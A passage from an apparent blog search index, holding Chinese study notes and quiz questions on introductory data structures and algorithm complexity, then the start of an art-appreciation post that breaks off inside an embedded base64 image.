    </entry>
    
    
    
    <entry>
      <title>数据结构第一章 绪论</title>
      <link href="/2021/10/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2021/10/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="程序设计的关键是什么？"><a href="#程序设计的关键是什么？" class="headerlink" title="程序设计的关键是什么？"></a>程序设计的关键是什么？</h2><p>数据表示：从问题抽象出数据模型，从机外表示转换为机内表示</p><p><img src="https://shierjinghuang.github.io/2021/10/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA.png" alt="数据表示"></p><p>数据处理：设计算法，再将算法转换为程序设计语言对应的程序</p><p><img src="https://shierjinghuang.github.io/2021/10/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86.png" alt="数据处理"></p><p>计算机不能分析问题并产生问题的解决方案，必须由人来分析问题、确定解决方案、编写程序，再让计算机执行程序最终获得问题的解</p><p>利用计算机求解问题的一般过程？</p><p><img src="https://shierjinghuang.github.io/2021/10/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98%E7%9A%84%E8%BF%87%E7%A8%8B.png" alt="计算机解决问题的过程"></p><p>本课程主要讨论非数值问题的数据组织和处理</p><p>（1）数据的逻辑结构：线性表、树、图等数据结构，其核心是如何组织待处理的数据以及数据之间的关系；</p><p>（2）数据的存储结构：如何将表、树、图等数据结构存储到计算机的存储器中，其核心是如何有效地存储数据以及数据之间的逻辑关系</p><p>（3）算法：如何基于数据的某种存储结构实现插入、删除、查找等基本操作，其核心是如何有效地处理数据；</p><p>（4）常用数据处理技术：查找技术、排序技术等。</p>### 数据结构的基础概念<p>数据：所有能输入到计算机中并能被程序识别和处理的符号集合</p><p><img src="https://shierjinghuang.github.io/2021/10/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE%E7%89%871.png" alt="数据"></p><p>数据元素：数据的基本单位，在程序中作为一个整体进行考虑和处理，通常情况下，数据元素具有相同个数和类型的数据项。</p><p>数据项：构成数据元素的最小单位</p><p>数据结构：相互之间存在一定关系的数据元素的集合</p><p>数据的逻辑结构：数据元素之间逻辑关系的整体</p><p><img src="https://shierjinghuang.github.io/2021/10/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E5%88%86%E7%B1%BB.png" alt="数据结构的分类"></p><h3 id="数据的存储结构"><a href="#数据的存储结构" class="headerlink" title="数据的存储结构"></a>数据的存储结构</h3><p>数据的存储（物理）结构：数据及其逻辑结构在计算机中的表示</p><p>（1）顺序存储结构：用一组连续的存储单元依次存储数据元素，数据元素之间的逻辑关系由元素的存储位置表示</p><p>（2）链接存储结构：用一组任意的存储单元存储数据元素，数据元素之间的逻辑关系用指针来表示 </p><h3 id="抽象数据类型"><a href="#抽象数据类型" class="headerlink" title="抽象数据类型"></a>抽象数据类型</h3><p>抽象数据类型：一个数据模型以及定义在该模型上的一组操作 </p><p><img src="https://shierjinghuang.github.io/2021/10/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%AE%9E%E7%8E%B0%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.png"></p><center>实现抽象数据类型</center>## 算法及算法的特性<p>算法 : 是对特定问题求解步骤的一种描述，是指令的有限序列</p><h4 id="算法的基本要求"><a href="#算法的基本要求" class="headerlink" title="算法的基本要求"></a>算法的基本要求</h4><p>（1）有穷性：总是在执行有穷步之后结束，且每一步都在有穷时间内完成</p><p>（2）确定性：每一条指令必须有确切的含义，相同的输入得到相同的输出</p><p>（3）可行性：操作步骤可以通过已经实现的基本操作执行有限次来实现</p><p><img src="https://shierjinghuang.github.io/2021/10/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%A5%BD%E4%BB%A3%E7%A0%81%E7%9A%84%E7%89%B9%E5%BE%81.png" alt="好代码的特征"></p><h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><p>算法分析：对已设计的算法，如何评价或判断其优劣</p><p>事后统计（定量分析）：将算法实现，测算其时间和空间开销</p><p>事前分析（定性分析）：对算法所消耗资源的一种估算方法</p><p>基本语句：执行次数与整个算法的执行次数成正比的操作指令</p><p>问题规模：输入量的多少</p><h3 id="算法的时间复杂度"><a href="#算法的时间复杂度" class="headerlink" title="算法的时间复杂度"></a>算法的时间复杂度</h3><p>时间复杂度：当问题规模充分大时，算法中基本语句的执行次数在渐近意义下的阶——关注的是增长趋势</p><p>定义1-1  若存在两个正的常数 c 和 n0，对于任意 n ≥ n0，都有T(n) ≤ c × f(n)，则称T(n) = O(f(n))。</p><p>T(n)和f(n)具有相同的增长趋势，T(n)的增长至多趋同于函数f(n)的增长</p><p><strong>Ο(1)＜(log2n)＜(n)＜(nlog2n)＜(n2)＜(n3)＜…＜(2n)＜(n!)</strong></p><p>时间复杂度是在不同数量级的层面上比较算法</p><h3 id="算法的空间复杂度"><a href="#算法的空间复杂度" class="headerlink" title="算法的空间复杂度"></a>算法的空间复杂度</h3><p>空间复杂度：算法在执行过程中需要的辅助空间数量</p><p>除算法本身和输入输出数据所占用的空间外，算法临时开辟的存储空间</p><p>空间复杂度也是问题规模的函数，通常记作：S(n) = O(f(n)) </p><p>就地（原地）算法：空间复杂度为O(1)，辅助空间是常数</p><p>定理1-1：若T(n) = amnm + am-1nm-1 +  + a1n + a0是一个m次多项式，则T(n) = O(nm)</p><p>分析的策略是从内部（或最深层部分）向外展开，分析的策略是设其执行次数为T(n)，则有2T(n) ≤ n，即T(n) ≤ log2n</p><p><img src="https://shierjinghuang.github.io/2021/10/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E9%80%92%E5%BD%92%E7%AE%97%E6%B3%95.png" alt="递归算法"></p><p>如果算法的时间代价与输入数据有关，则需要分析最好情况、最坏情况、平均情况</p><ol><li>最好情况：不能代表算法的效率，当出现概率较大时分析</li><li>最坏情况：最坏能坏到什么程度，实时系统需要分析</li><li>平均情况：已知输入数据分布情况，通常假设等概率分布</li></ol><h1 id="数据结构-第一章-绪论题目"><a href="#数据结构-第一章-绪论题目" class="headerlink" title="数据结构 第一章 绪论题目"></a>数据结构 第一章 绪论题目</h1><h3 id="判断题"><a href="#判断题" class="headerlink" title="判断题"></a>判断题</h3><ol><li>数据元素是数据的最小单位。  (F)</li><li> 数据的逻辑结构是指数据的各数据项之间的逻辑关系。 (F)</li><li> 数据结构概念包括数据之间的逻辑结构、数据在计算机中的存储方式和数据的运算三个方面。 (T)</li><li> 数据结构的抽象操作的定义与具体实现有关。 (F)</li><li> 算法和程序没有区别，在数据结构中二者是通用的。  (F)</li><li> 数据结构包括数据对象集以及它们的逻辑结构和物理结构，还包括与数据对象相关联的操作集，以及实现这些操作的高效的算法。  (T)</li></ol><h3 id="单选题"><a href="#单选题" class="headerlink" title="单选题"></a>单选题</h3><ol><li> 在 Data_Structure = (D，R)中，D 是（ ）的有限集合。  (A)</li></ol><p>   A 数据元素   B 算法  C   数据操作   D数据对象</p><ol start="2"><li> 以下关于数据结构的说法中错误的是（ ）   (A)</li></ol><p>   A.数据结构相同，对应的存储结构也相同  B.数据结构涉及数据的逻辑结构存储结构和施加其上的操作3个方面</p><p>   C.数据结构操作的实现与存储结构有关    D.定义逻辑结构时可不考虑存储结构</p><ol start="3"><li> 算法分析的目的是( )    (C)</li></ol><p>   A.找出数据结构的合理性                                  B.研究算法中的输入和输出的关系   </p><p>   C.分析算法的效率以求改进                              D.分析算法的易读性和文档性</p><ol start="4"><li> 算法分析的两个主要方面是( )  (A)</li></ol><p>   A.空间复杂度和时间复杂度   B.正确性和简明性 C.可读性和文档性 D.数据复杂性和程序复杂性</p><ol start="5"><li><p>采用链结构存储线性表时，其地址（ ）。</p></li><li><p> 一个正确的算法应该具有 5 个特性，除输入、输出特性外，另外 3 个特性是（ ）。  </p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>艺术鉴赏</title>
      <link href="/2021/10/28/%E8%89%BA%E6%9C%AF%E9%89%B4%E8%B5%8F/"/>
      <url>/2021/10/28/%E8%89%BA%E6%9C%AF%E9%89%B4%E8%B5%8F/</url>
      
        <content type="html"><![CDATA[  <h2><center>掷地有声——乌合麒麟</center></h2><p>其实打开这个话题我，也没有很大的把握，我也并不很清楚乌合麒麟的画作，究竟算不算艺术，究竟是什么风格？抱着懂与不懂的疑惑，我还是决定打开这个话题。我谨从乌合麒麟的《神明改造》推开来谈一下这个话题。</p><p><img src="data:image/jpeg;base64,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